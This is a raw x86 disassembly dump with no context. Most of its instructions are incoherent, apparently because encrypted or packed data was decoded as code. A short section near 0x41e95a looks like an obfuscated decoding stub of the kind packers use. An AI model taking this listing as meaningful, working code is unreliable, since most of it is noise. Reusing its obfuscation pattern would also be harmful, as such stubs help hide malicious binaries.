  41e284:	add    bl,BYTE PTR [eiz*1+0x28699007]
  41e28b:	dec    edx
  41e28c:	hlt    
  41e28d:	lds    edx,FWORD PTR [esi]
  41e28f:	paddd  mm2,QWORD PTR [edx-0x3b0f27e2]
  41e296:	sbb    al,0xc9
  41e298:	jge    0x41e2df
  41e29a:	mov    DWORD PTR [eax],0x3eb19fbf
  41e2a0:	lea    edi,ds:0xbde7152f
  41e2a6:	mov    ds:0x84061705,eax
  41e2ab:	je     0x41e2fa
  41e2ad:	cmp    bh,BYTE PTR [ebx-0x49a3c034]
  41e2b3:	mov    cl,0x39
  41e2b5:	adc    esi,eax
  41e2b7:	les    edx,FWORD PTR [ebp+0x2]
  41e2ba:	outs   dx,BYTE PTR ds:[esi]
  41e2bb:	push   0x23648e4b
  41e2c0:	mov    WORD PTR [di+0x6089],ss
  41e2c5:	xor    al,al
  41e2c7:	shl    BYTE PTR [esi],cl
  41e2c9:	adc    BYTE PTR [ebx],cl
  41e2cb:	out    0xb4,al
  41e2cd:	imul   ax,WORD PTR fs:[edx+0x26069e53],0x28
  41e2d6:	lahf   
  41e2d7:	das    
  41e2d8:	adc    ebp,DWORD PTR [esi-0x28]
  41e2db:	mov    ds:0xc989228f,eax
  41e2e0:	jle    0x41e31a
  41e2e2:	jo     0x41e363
  41e2e4:	or     DWORD PTR [esi-0x1a788b59],esi
  41e2ea:	in     al,dx
  41e2eb:	mov    ds:0xac867cb,eax
  41e2f0:	shl    DWORD PTR [edi],1
  41e2f2:	push   ds
  41e2f3:	pop    edi
  41e2f4:	push   ds
  41e2f5:	loop   0x41e346
  41e2f7:	(bad)  
  41e2f8:	mov    al,0x12
  41e2fa:	mov    bh,0xbe
  41e2fc:	add    si,0xffe1
  41e300:	sub    ebx,DWORD PTR [eax]
  41e302:	fwait
  41e303:	repnz add al,0x87
  41e306:	lods   al,BYTE PTR ds:[esi]
  41e307:	arpl   di,bx
  41e309:	outs   dx,DWORD PTR ds:[esi]
  41e30a:	mov    esp,0x50e9eb88
  41e30f:	cmp    al,0x4f
  41e311:	cmp    eax,DWORD PTR [edx]
  41e313:	fild   QWORD PTR [edx+0x537f5c92]
  41e319:	sahf   
  41e31a:	mov    BYTE PTR [ecx],0xa9
  41e31d:	cli    
  41e31e:	xchg   ebp,eax
  41e31f:	test   ecx,esi
  41e321:	xor    bl,al
  41e323:	sbb    eax,0x41b1d86c
  41e328:	mov    ds:0xefd936dc,al
  41e32d:	jmp    0x5b6a5d1f
  41e332:	xlat   BYTE PTR ds:[ebx]
  41e333:	mov    bl,0x2e
  41e335:	jg     0x41e35a
  41e337:	jne    0x41e30a
  41e339:	ja     0x41e2c5
  41e33b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e33d:	xor    al,0xa5
  41e33f:	inc    esp
  41e340:	inc    esp
  41e341:	das    
  41e342:	in     eax,0xc7
  41e344:	and    DWORD PTR [edi-0x63edb3a3],edi
  41e34a:	cmp    edx,ebp
  41e34c:	fistp  DWORD PTR [edx+0x66a9988f]
  41e352:	jo     0x41e3d1
  41e354:	cmp    ecx,DWORD PTR [esi]
  41e356:	push   ebx
  41e357:	inc    ebx
  41e358:	scas   al,BYTE PTR es:[edi]
  41e359:	ret    
  41e35a:	jmp    0x40541aa8
  41e35f:	mov    bl,0x94
  41e361:	(bad)  
  41e362:	cli    
  41e363:	lds    edi,FWORD PTR [esi+0xe]
  41e366:	pop    es
  41e367:	pusha  
  41e368:	dec    BYTE PTR [eax-0x70]
  41e36b:	fst    DWORD PTR [edi+0x57fe6fb6]
  41e371:	out    dx,eax
  41e372:	mov    esp,0xcc242015
  41e377:	push   0xd922d7a1
  41e37c:	push   0x983fab07
  41e381:	aas    
  41e382:	dec    esi
  41e383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e384:	clc    
  41e385:	fsubr  st,st(0)
  41e387:	adc    dl,BYTE PTR [edx]
  41e389:	mov    ch,0x3a
  41e38b:	jp     0x41e33e
  41e38d:	lods   al,BYTE PTR ds:[esi]
  41e38e:	or     DWORD PTR [esi+edx*4],eax
  41e391:	or     DWORD PTR [esi+0x7a2687ea],0x61
  41e398:	jecxz  0x41e3dd
  41e39a:	retf   
  41e39b:	mov    ebp,DWORD PTR [ebx+0x32c81f5]
  41e3a1:	lods   eax,DWORD PTR ds:[esi]
  41e3a2:	test   BYTE PTR [ebp-0x5d63c609],0x8c
  41e3a9:	(bad)  
  41e3aa:	pop    esp
  41e3ab:	retf   0x3b02
  41e3ae:	scas   eax,DWORD PTR es:[edi]
  41e3af:	repnz mov eax,edi
  41e3b2:	ins    BYTE PTR es:[edi],dx
  41e3b3:	mov    esp,0xd07ae645
  41e3b8:	stos   BYTE PTR es:[edi],al
  41e3b9:	rcl    ch,0xe7
  41e3bc:	jmp    FWORD PTR [ebp+0x1b]
  41e3bf:	inc    eax
  41e3c0:	enter  0xbc45,0xa4
  41e3c4:	clc    
  41e3c5:	imul   ebp,DWORD PTR [edi-0x41dacc9e],0x77
  41e3cc:	pop    esi
  41e3cd:	and    BYTE PTR ds:0x2d811aa8,dl
  41e3d3:	push   edi
  41e3d4:	mov    edi,0x5eee4704
  41e3d9:	adc    eax,0x5cb2787f
  41e3de:	or     dl,al
  41e3e0:	jbe    0x41e438
  41e3e2:	test   ah,dh
  41e3e4:	inc    ebx
  41e3e5:	(bad)  
  41e3e6:	out    dx,al
  41e3e7:	inc    ebx
  41e3e8:	sahf   
  41e3e9:	gs push edi
  41e3eb:	cmc    
  41e3ec:	lods   al,BYTE PTR ds:[esi]
  41e3ed:	ror    BYTE PTR [esi+0x62bcb918],1
  41e3f3:	shl    ecx,0x1b
  41e3f6:	out    dx,al
  41e3f7:	xchg   esp,eax
  41e3f8:	xchg   bl,al
  41e3fa:	xlat   BYTE PTR ds:[ebx]
  41e3fb:	push   DWORD PTR [edi+0x15]
  41e3fe:	sub    BYTE PTR [ecx+0x21],bh
  41e401:	dec    ecx
  41e402:	pop    eax
  41e403:	mov    cl,0xb2
  41e405:	shl    ebp,cl
  41e407:	mov    al,ds:0x32483389
  41e40c:	(bad)  
  41e40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e40e:	gs inc edi
  41e410:	dec    ebp
  41e411:	push   ebx
  41e412:	xlat   BYTE PTR ds:[ebx]
  41e413:	mov    esp,0x1f702480
  41e418:	adc    dh,ah
  41e41a:	xor    ecx,ebx
  41e41c:	sbb    eax,0x2f3b3aa0
  41e421:	in     eax,dx
  41e422:	mov    ds:0x95df3c78,eax
  41e427:	or     esp,esi
  41e429:	inc    edx
  41e42a:	cmc    
  41e42b:	mov    eax,ds:0x636f00c5
  41e430:	popf   
  41e431:	inc    ebp
  41e432:	outs   dx,DWORD PTR ds:[esi]
  41e433:	and    BYTE PTR [ecx-0x17],ah
  41e436:	mov    cs,WORD PTR [ecx]
  41e438:	cmc    
  41e439:	jbe    0x41e3eb
  41e43b:	inc    ebp
  41e43c:	mov    al,0x96
  41e43e:	add    eax,DWORD PTR [ecx+0x51543b60]
  41e444:	ss das 
  41e446:	sar    ebx,cl
  41e448:	dec    ebp
  41e449:	inc    bx
  41e44b:	js     0x41e44a
  41e44d:	repnz sbb eax,0x24499855
  41e453:	int3   
  41e454:	test   BYTE PTR [ecx-0x3b5b04],dh
  41e45a:	cmp    bl,BYTE PTR [ebx]
  41e45c:	pusha  
  41e45d:	xchg   ecx,eax
  41e45e:	test   al,0x38
  41e460:	mov    edi,0xd53e26e3
  41e465:	mov    ebp,0x7b3e1e1f
  41e46a:	mov    edi,0x26728855
  41e46f:	xchg   BYTE PTR [edx+ebx*4],cl
  41e472:	sbb    DWORD PTR [ecx],eax
  41e474:	loopne 0x41e3f8
  41e476:	jge    0x41e407
  41e478:	inc    eax
  41e479:	scas   al,BYTE PTR es:[edi]
  41e47a:	out    dx,eax
  41e47b:	xchg   esp,eax
  41e47c:	fisubr DWORD PTR [esi+0x40]
  41e47f:	xchg   edi,eax
  41e480:	jnp    0x41e46c
  41e482:	dec    ebx
  41e483:	rcr    DWORD PTR [ecx],cl
  41e485:	mov    edx,0xd64a88dd
  41e48a:	fwait
  41e48b:	add    al,0xed
  41e48d:	pop    ds
  41e48e:	push   esp
  41e48f:	ins    BYTE PTR es:[edi],dx
  41e490:	stos   DWORD PTR es:[edi],eax
  41e491:	test   DWORD PTR [edx],edi
  41e493:	add    ebp,DWORD PTR [ebx-0x35e5f79d]
  41e499:	adc    ch,dl
  41e49b:	inc    esi
  41e49c:	dec    edx
  41e49d:	xchg   esp,eax
  41e49e:	rol    DWORD PTR [ebp+0x777120f3],0xb5
  41e4a5:	lahf   
  41e4a6:	jle    0x41e51c
  41e4a8:	test   BYTE PTR [edx+0x15a1c9b4],ah
  41e4ae:	in     eax,dx
  41e4af:	sub    BYTE PTR [eax+eiz*8+0x8],0x5d
  41e4b4:	xchg   edx,eax
  41e4b5:	int3   
  41e4b6:	(bad)  
  41e4b7:	hlt    
  41e4b8:	mov    ebp,0x6edb3fa1
  41e4bd:	inc    edi
  41e4be:	lock jmp 0xe7be:0xb39c544b
  41e4c6:	push   edi
  41e4c7:	sub    al,0x92
  41e4c9:	mov    esp,esp
  41e4cb:	add    eax,DWORD PTR [edi]
  41e4cd:	mov    DWORD PTR [ebp+ebp*4-0x3a9748a1],ebx
  41e4d4:	mov    edx,0x8b85579b
  41e4d9:	add    DWORD PTR [edx+0x1b],edi
  41e4dc:	dec    edi
  41e4dd:	cmp    BYTE PTR ds:0xcd203e48,dh
  41e4e3:	push   ecx
  41e4e4:	xchg   esp,eax
  41e4e5:	sub    al,bl
  41e4e7:	push   es
  41e4e8:	(bad)  
  41e4e9:	or     DWORD PTR [esi-0x79],eax
  41e4ec:	leave  
  41e4ed:	mov    al,ds:0xda13725
  41e4f2:	retf   0x3bac
  41e4f5:	sub    al,0x92
  41e4f7:	sti    
  41e4f8:	adc    al,al
  41e4fa:	shl    ecx,1
  41e4fc:	daa    
  41e4fd:	shl    BYTE PTR [esi],0xd0
  41e500:	es out 0xa7,eax
  41e503:	(bad)  
  41e504:	es scas al,BYTE PTR es:[edi]
  41e506:	mov    esi,DWORD PTR [esp+ebx*1-0x50]
  41e50a:	xor    al,0xe9
  41e50c:	sub    esp,edi
  41e50e:	rcl    ebx,cl
  41e510:	mov    WORD PTR [eax+0x5b5d068],ds
  41e516:	mov    cl,0xeb
  41e518:	inc    edi
  41e519:	test   DWORD PTR [ecx-0x7ef1acd4],0xe25b112
  41e523:	jp     0x41e4d3
  41e525:	fs ffreep st(2)
  41e528:	shr    BYTE PTR [edx+0x15],0xd8
  41e52c:	or     eax,0xcc87cf98
  41e531:	cmp    edx,esp
  41e533:	lea    ecx,[ecx]
  41e535:	mov    BYTE PTR [ebx-0x1c],bh
  41e538:	sub    ah,ah
  41e53a:	cmp    DWORD PTR [ebp+0x7],ecx
  41e53d:	mov    dl,0x3a
  41e53f:	dec    ecx
  41e540:	pop    edi
  41e541:	xchg   esp,eax
  41e542:	dec    ebp
  41e543:	scas   al,BYTE PTR es:[edi]
  41e544:	push   cs
  41e545:	adc    eax,0x394ae17c
  41e54a:	jge    0x41e584
  41e54c:	int    0x24
  41e54e:	aas    
  41e54f:	mov    ebp,0xe2b9e8d
  41e554:	in     eax,0xf1
  41e556:	sbb    BYTE PTR es:[eax],bl
  41e559:	lods   al,BYTE PTR fs:[esi]
  41e55b:	xor    BYTE PTR ds:[edx],ah
  41e55e:	pop    es
  41e55f:	jb     0x41e5c4
  41e561:	xor    BYTE PTR [esp+eax*8-0x145378b8],bh
  41e568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e569:	je     0x41e549
  41e56b:	mov    ds:0x6602b45f,al
  41e570:	lock jbe 0x41e54d
  41e573:	hlt    
  41e574:	sahf   
  41e575:	xchg   ecx,eax
  41e576:	add    ecx,ecx
  41e578:	pushf  
  41e579:	imul   edx,DWORD PTR [ecx-0x6735a710],0xffffffec
  41e580:	push   ebp
  41e581:	mov    eax,ds:0x7b0b1eec
  41e586:	sbb    al,0xed
  41e588:	sbb    ebx,0x71
  41e58b:	sub    al,0x19
  41e58d:	add    esp,DWORD PTR [ebp-0xc0112c1]
  41e593:	inc    ecx
  41e594:	fnsave [edx+ebx*8+0x32089c8a]
  41e59b:	arpl   dx,bx
  41e59d:	call   0x1902:0x71b3f94c
  41e5a4:	or     esp,DWORD PTR [edx-0x55]
  41e5a7:	and    eax,0x235d3892
  41e5ac:	dec    edx
  41e5ad:	sbb    ecx,DWORD PTR fs:[edi+0x6d]
  41e5b1:	sbb    eax,DWORD PTR [edx-0x4]
  41e5b4:	ja     0x41e584
  41e5b6:	jns    0x41e61a
  41e5b8:	mov    ch,dh
  41e5ba:	(bad)  
  41e5bb:	das    
  41e5bc:	mov    eax,0x1caaf691
  41e5c1:	mov    edx,0xa49640b6
  41e5c6:	or     ebx,DWORD PTR [ecx-0x39]
  41e5c9:	daa    
  41e5ca:	imul   esp,DWORD PTR [edi-0x18c3f13e],0x10
  41e5d1:	pop    ebp
  41e5d2:	mov    ebx,edx
  41e5d4:	mov    ds:0xd7c02a0b,eax
  41e5d9:	cmc    
  41e5da:	sahf   
  41e5db:	inc    ecx
  41e5dc:	and    eax,0xbfaa5366
  41e5e1:	jno    0x41e65c
  41e5e3:	in     eax,dx
  41e5e4:	mov    esp,0x3eed13fa
  41e5e9:	or     BYTE PTR [edi],al
  41e5eb:	jmp    0x41e5ab
  41e5ed:	fld    QWORD PTR ds:0xf4c6d08d
  41e5f3:	je     0x41e64a
  41e5f5:	jnp    0x41e629
  41e5f7:	stos   DWORD PTR es:[edi],eax
  41e5f8:	arpl   di,sp
  41e5fa:	inc    ebp
  41e5fb:	(bad)  
  41e5fc:	push   ss
  41e5fd:	jmp    0x476186c9
  41e602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e603:	stos   DWORD PTR es:[edi],eax
  41e604:	fdiv   DWORD PTR [ebx]
  41e606:	psubusw mm3,QWORD PTR [esi+0x27b95a7]
  41e60d:	sbb    eax,edx
  41e60f:	jb     0x41e683
  41e611:	in     eax,dx
  41e612:	mov    ch,0x69
  41e614:	fbld   TBYTE PTR [ebx+0x34]
  41e617:	loop   0x41e67c
  41e619:	iret   
  41e61a:	mov    esi,0xe63f445
  41e61f:	jp     0x41e651
  41e621:	aam    0x2c
  41e623:	and    BYTE PTR [edi+0x24],bl
  41e626:	outs   dx,BYTE PTR ds:[esi]
  41e627:	dec    esi
  41e628:	fisttp DWORD PTR [esi]
  41e62a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e62b:	pop    es
  41e62c:	add    eax,0x6527daba
  41e631:	int3   
  41e632:	jge    0x41e5f4
  41e634:	cmp    esp,DWORD PTR ds:0xfcf1d323
  41e63a:	popf   
  41e63b:	shl    ah,cl
  41e63d:	adc    bh,cl
  41e63f:	push   ds
  41e640:	fnstcw WORD PTR [edi]
  41e642:	dec    esi
  41e643:	inc    esi
  41e644:	pop    esi
  41e645:	adc    al,0x6f
  41e647:	lea    esp,[edx-0x397b84ee]
  41e64d:	fidivr DWORD PTR [eax]
  41e64f:	push   es
  41e650:	mov    edx,0x3e8a565f
  41e655:	stos   DWORD PTR es:[edi],eax
  41e656:	aam    0xf
  41e658:	sbb    dh,cl
  41e65a:	lods   eax,DWORD PTR ds:[esi]
  41e65b:	pop    edx
  41e65c:	mov    dl,0xf5
  41e65e:	(bad)  
  41e65f:	and    al,0x45
  41e661:	(bad)  
  41e662:	icebp  
  41e663:	mov    dh,0xf7
  41e665:	leave  
  41e666:	popa   
  41e667:	ficom  WORD PTR [esi-0x11]
  41e66a:	sbb    al,0xac
  41e66c:	loop   0x41e620
  41e66e:	loope  0x41e6a0
  41e670:	xor    DWORD PTR [esi-0xe],edx
  41e673:	into   
  41e674:	or     DWORD PTR [edi+ebx*4+0x6a],0xa8b67a5b
  41e67c:	dec    esp
  41e67d:	repnz mov bh,0xbf
  41e680:	pop    esp
  41e681:	xchg   DWORD PTR [edi],edx
  41e683:	leave  
  41e684:	loope  0x41e66b
  41e686:	test   DWORD PTR ds:0x8d96231,0x6cb57dc4
  41e690:	dec    edx
  41e691:	test   al,0xfa
  41e693:	sub    DWORD PTR [esi+0x18ac9cf8],ebx
  41e699:	jno    0x41e6a8
  41e69b:	jmp    0xb88799ad
  41e6a0:	mov    ?,WORD PTR [edx]
  41e6a2:	cmp    eax,0x5bc3cc83
  41e6a7:	cmp    eax,0x522e6a5d
  41e6ac:	jge    0x41e6be
  41e6ae:	cmp    BYTE PTR [edx],ah
  41e6b0:	loop   0x41e72f
  41e6b2:	retf   0xd0b6
  41e6b5:	shl    BYTE PTR [ebx+0x50],cl
  41e6b8:	mov    ah,0x3b
  41e6ba:	sub    BYTE PTR [ebx],ah
  41e6bc:	cmp    cl,dh
  41e6be:	cmp    esp,edx
  41e6c0:	xor    al,0x7e
  41e6c2:	jmp    0xcd076e72
  41e6c7:	ins    DWORD PTR es:[edi],dx
  41e6c8:	out    dx,al
  41e6c9:	jbe    0x41e738
  41e6cb:	in     al,dx
  41e6cc:	inc    eax
  41e6cd:	jg     0x41e70f
  41e6cf:	jae    0x41e6a7
  41e6d1:	in     al,0xc6
  41e6d3:	cld    
  41e6d4:	repz add eax,0xd8cc97cc
  41e6da:	test   al,0x7
  41e6dc:	test   cl,cl
  41e6de:	lods   al,BYTE PTR ds:[esi]
  41e6df:	in     al,dx
  41e6e0:	scas   al,BYTE PTR es:[edi]
  41e6e1:	icebp  
  41e6e2:	adc    ecx,esp
  41e6e4:	and    BYTE PTR [eax],ah
  41e6e6:	or     eax,0x4eec4da4
  41e6eb:	outs   dx,BYTE PTR ds:[esi]
  41e6ec:	retf   0x69a9
  41e6ef:	mov    cl,0xfe
  41e6f1:	inc    ebp
  41e6f2:	pusha  
  41e6f3:	xchg   edx,eax
  41e6f4:	dec    edx
  41e6f5:	cmp    al,0xa8
  41e6f7:	outs   dx,BYTE PTR ds:[esi]
  41e6f8:	in     eax,0xf7
  41e6fa:	retf   
  41e6fb:	jp     0x41e696
  41e6fd:	inc    ebx
  41e6fe:	mov    esi,0x102bfc70
  41e703:	adc    al,dl
  41e705:	push   edi
  41e706:	cmc    
  41e707:	adc    ebx,ecx
  41e709:	mov    esp,0x60fbde10
  41e70e:	xor    al,0xf6
  41e710:	aam    0xc5
  41e712:	imul   edx,DWORD PTR ds:0x68d44af9,0x70
  41e719:	add    al,0xcf
  41e71b:	imul   esi,DWORD PTR [edi],0xb303bc3c
  41e721:	test   al,0x5a
  41e723:	(bad)
  41e726:	mul    DWORD PTR [ebp+0x2c05726]
  41e72c:	cmp    al,0xf9
  41e72e:	mov    ds:0x9fb2be8d,al
  41e733:	cmc    
  41e734:	js     0x41e79a
  41e736:	repz adc al,0xa2
  41e739:	and    ecx,DWORD PTR [eax+0x6a]
  41e73c:	not    DWORD PTR [ebx+0x6e]
  41e73f:	test   BYTE PTR [esi-0x2b],bh
  41e742:	retf   
  41e743:	out    0x82,eax
  41e745:	fstp   TBYTE PTR [ebp-0x76]
  41e748:	pushf  
  41e749:	out    dx,eax
  41e74a:	xchg   esi,eax
  41e74b:	xor    al,0xe7
  41e74d:	repnz add cl,BYTE PTR [ebx+0x2d]
  41e751:	push   0xffffff8e
  41e753:	fcomp  DWORD PTR [ebx+ebp*8]
  41e756:	add    al,0x28
  41e758:	push   ds
  41e759:	fst    QWORD PTR [ecx+0x8]
  41e75c:	addr16 sbb esi,edx
  41e75f:	sbb    DWORD PTR [ecx-0x74],ebx
  41e762:	fnstcw WORD PTR [ecx-0x26bae3c5]
  41e768:	push   0xdf61415d
  41e76d:	clc    
  41e76e:	test   ax,0xb091
  41e772:	(bad)  
  41e773:	jp     0x3b533811
  41e779:	xchg   BYTE PTR [ebx],ch
  41e77b:	xor    BYTE PTR [edi-0x75],bl
  41e77e:	adc    al,0x10
  41e780:	fld    DWORD PTR [ebp-0x7968d7a5]
  41e786:	jns    0x41e7a8
  41e788:	add    ecx,ebp
  41e78a:	mov    ch,0xb5
  41e78c:	fld    TBYTE PTR [ebx+edx*8+0xc]
  41e790:	xchg   ecx,eax
  41e791:	adc    DWORD PTR [ecx-0x1f09f886],edi
  41e797:	leave  
  41e798:	fisttp QWORD PTR [edi+0x70a55080]
  41e79e:	lods   al,BYTE PTR ds:[esi]
  41e79f:	mov    ds:0x750217d5,al
  41e7a4:	into   
  41e7a5:	inc    edx
  41e7a6:	push   esi
  41e7a7:	lods   eax,DWORD PTR ds:[esi]
  41e7a8:	jb     0x41e76e
  41e7aa:	shl    DWORD PTR [ebp-0x6436f838],0xc0
  41e7b1:	dec    eax
  41e7b2:	sbb    edx,edi
  41e7b4:	ret    
  41e7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7b6:	mov    ebx,0x4e75d6e4
  41e7bb:	or     bl,ah
  41e7bd:	xchg   ecx,eax
  41e7be:	add    eax,0x4e15ed95
  41e7c3:	bound  edx,QWORD PTR [esi-0x1e476b3c]
  41e7c9:	sbb    BYTE PTR [edx],bh
  41e7cb:	bound  ecx,QWORD PTR [edi]
  41e7cd:	neg    DWORD PTR [edi+esi*4]
  41e7d0:	xor    edi,DWORD PTR [eax]
  41e7d2:	and    eax,DWORD PTR [esi-0x26]
  41e7d5:	out    0x28,eax
  41e7d7:	jl     0x41e792
  41e7d9:	fdiv   QWORD PTR [ecx-0x25]
  41e7dc:	sar    BYTE PTR [ebp-0x65],cl
  41e7df:	xor    bh,dl
  41e7e1:	fdiv   DWORD PTR [ebp+0x19605c03]
  41e7e7:	lahf   
  41e7e8:	repnz add DWORD PTR [ebx+0x53a6d00f],esp
  41e7ef:	aad    0x19
  41e7f1:	push   ss
  41e7f2:	adc    eax,0x37318bcb
  41e7f7:	xor    eax,esp
  41e7f9:	int    0x96
  41e7fb:	push   ecx
  41e7fc:	test   eax,0xeb07a8d4
  41e801:	enter  0x7631,0xb5
  41e805:	fidiv  DWORD PTR [esi-0x50fb40d9]
  41e80b:	xor    esp,DWORD PTR ds:0x4399bb41
  41e811:	xchg   edx,eax
  41e812:	jp     0x41e7fe
  41e814:	dec    ebx
  41e815:	push   0x2c878d66
  41e81a:	clc    
  41e81b:	sbb    ch,BYTE PTR [edi-0x7e192bef]
  41e821:	push   cs
  41e822:	xor    dl,BYTE PTR [esi+ebx*4]
  41e825:	xchg   ebp,eax
  41e826:	or     eax,0xb417c69
  41e82b:	or     eax,0x87d47396
  41e830:	std    
  41e831:	div    BYTE PTR [edx]
  41e833:	sbb    eax,0xdde01910
  41e838:	data16 mov dh,cl
  41e83b:	xchg   edx,eax
  41e83c:	cs leave 
  41e83e:	ficom  DWORD PTR [eax-0x2eb46355]
  41e844:	dec    esi
  41e845:	mov    ch,0xd7
  41e847:	cmp    eax,0xfaf085c1
  41e84c:	loop   0x41e8be
  41e84e:	inc    esi
  41e84f:	jl     0x41e827
  41e851:	inc    esp
  41e852:	scas   eax,DWORD PTR es:[edi]
  41e853:	leave  
  41e854:	scas   eax,DWORD PTR es:[edi]
  41e855:	pop    ds
  41e856:	and    dl,BYTE PTR [edi-0x23]
  41e859:	and    ah,BYTE PTR [ecx-0xb572d1a]
  41e85f:	inc    esp
  41e860:	fdivr  QWORD PTR [eax-0x61b135c3]
  41e866:	dec    eax
  41e867:	mov    esp,0xe0304407
  41e86c:	mov    edi,0xd1c83951
  41e871:	xor    eax,0xe9e9b30a
  41e876:	loopne 0x41e848
  41e878:	shl    ebx,0x5e
  41e87b:	push   eax
  41e87c:	cmp    BYTE PTR [esi-0x21a7a129],0x46
  41e883:	sbb    bl,cl
  41e885:	mov    al,ds:0x6f5626ae
  41e88a:	shl    BYTE PTR [ebx+edx*2-0x4],1
  41e88e:	jns    0x41e87a
  41e890:	xor    BYTE PTR [esi-0x64a12409],0x5c
  41e897:	cmp    ecx,0x197705fd
  41e89d:	mov    WORD PTR [eax+0x53],ss
  41e8a0:	xchg   ecx,eax
  41e8a1:	xlat   BYTE PTR ds:[ebx]
  41e8a2:	adc    ch,dh
  41e8a4:	sub    eax,esp
  41e8a6:	xchg   ebx,eax
  41e8a7:	sub    dh,bh
  41e8a9:	shl    DWORD PTR fs:[ebp+0x3c9a9bd4],1
  41e8b0:	fdiv   st,st(3)
  41e8b2:	cld    
  41e8b3:	hlt    
  41e8b4:	and    ecx,eax
  41e8b6:	or     BYTE PTR [edi],dh
  41e8b8:	icebp  
  41e8b9:	dec    ecx
  41e8ba:	mov    edi,0x2a7e550a
  41e8bf:	repz add eax,eax
  41e8c2:	dec    ebx
  41e8c3:	aas    
  41e8c4:	mov    ah,BYTE PTR [eax+ebp*8-0x682f9370]
  41e8cb:	and    al,0xf9
  41e8cd:	inc    ebx
  41e8ce:	dec    edi
  41e8cf:	shr    cl,cl
  41e8d1:	popa   
  41e8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8d3:	(bad)  
  41e8d4:	data16 lahf 
  41e8d6:	inc    ecx
  41e8d7:	out    0xd,eax
  41e8d9:	jge    0x41e8e1
  41e8db:	add    DWORD PTR [eax],esp
  41e8dd:	inc    ebx
  41e8de:	in     al,0xe5
  41e8e0:	and    al,0xb4
  41e8e2:	dec    edi
  41e8e3:	stos   BYTE PTR es:[edi],al
  41e8e4:	and    cl,0x16
  41e8e7:	ret    
  41e8e8:	or     esi,DWORD PTR [edx-0x52]
  41e8eb:	pop    ss
  41e8ec:	cmp    eax,0xecf5f168
  41e8f1:	push   es
  41e8f2:	xor    esi,DWORD PTR [edi]
  41e8f4:	jno    0x41e93a
  41e8f6:	xchg   ebp,eax
  41e8f7:	scas   al,BYTE PTR es:[edi]
  41e8f8:	fucomp st(7)
  41e8fa:	imul   ecx,DWORD PTR [ebp-0x69],0x9264497
  41e901:	xor    al,0xb6
  41e903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e904:	dec    edx
  41e905:	retf   
  41e906:	aam    0x41
  41e908:	jg     0x41e8e5
  41e90a:	jnp    0x41e8fb
  41e90c:	push   cs
  41e90d:	imul   ebp,edx,0xffffffbd
  41e910:	dec    edx
  41e911:	push   DWORD PTR [ebx]
  41e913:	sahf   
  41e914:	push   ss
  41e915:	pop    ebx
  41e916:	enter  0x79b2,0x37
  41e91a:	pop    ss
  41e91b:	stos   DWORD PTR es:[edi],eax
  41e91c:	and    al,0x7c
  41e91e:	jle    0x41e8ac
  41e920:	in     al,dx
  41e921:	mul    edi
  41e923:	add    ch,BYTE PTR [eax]
  41e925:	mov    cl,0xe7
  41e927:	pop    ecx
  41e928:	das    
  41e929:	rol    BYTE PTR [ebp+0x6712891],0x90
  41e930:	or     al,al
  41e932:	mov    edi,0x44192953
  41e937:	add    esi,ebx
  41e939:	inc    ebx
  41e93a:	daa    
  41e93b:	call   0xcc9:0xce40b7c
  41e942:	push   esi
  41e943:	in     al,dx
  41e944:	or     eax,0x1d3d8cef
  41e949:	push   bp
  41e94b:	pop    ds
  41e94c:	xor    edx,eax
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fnstenv es:[edx]
  41e99b:	pop    ecx
  41e99c:	or     bl,BYTE PTR [edx+0x7a7dc28e]
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41ea0d
  41e9a7:	or     BYTE PTR [ecx-0x32],0x50
  41e9ab:	xor    esi,DWORD PTR [edi+0xc]
  41e9ae:	adc    eax,0x6639a58c
  41e9b3:	xchg   DWORD PTR [esi+0x3575cd08],ecx
  41e9b9:	fild   DWORD PTR [ecx]
  41e9bb:	sbb    bl,BYTE PTR [ebp+0x3bd4a842]
  41e9c1:	sar    cl,0xa4
  41e9c4:	je     0x41e99b
  41e9c6:	and    eax,0xcbe6e48f
  41e9cb:	(bad)  
  41e9cd:	jnp    0x41ea47
  41e9cf:	out    0xef,al
  41e9d1:	mov    eax,0x82ec803e
  41e9d6:	push   DWORD PTR [ecx]
  41e9d8:	add    dh,BYTE PTR [ecx]
  41e9da:	xor    BYTE PTR ds:0xc6fcb061,ah
  41e9e0:	(bad)  
  41e9e1:	dec    ebp
  41e9e2:	and    al,BYTE PTR [ebx]
  41e9e4:	jns    0x41e9e5
  41e9e6:	push   edx
  41e9e7:	xor    eax,0xdfc91f50
  41e9ec:	pop    ebp
  41e9ed:	push   edx
  41e9ee:	int    0x41
  41e9f0:	popf   
  41e9f1:	rcl    BYTE PTR [ebx-0x2d274384],cl
  41e9f7:	dec    ecx
  41e9f8:	adc    dl,ah
  41e9fa:	(bad)  
  41e9fb:	icebp  
  41e9fc:	repnz cmp DWORD PTR [edx],0xffffffd4
  41ea00:	push   0xffffffac
  41ea02:	inc    ebp
  41ea03:	mov    eax,0x730d620d
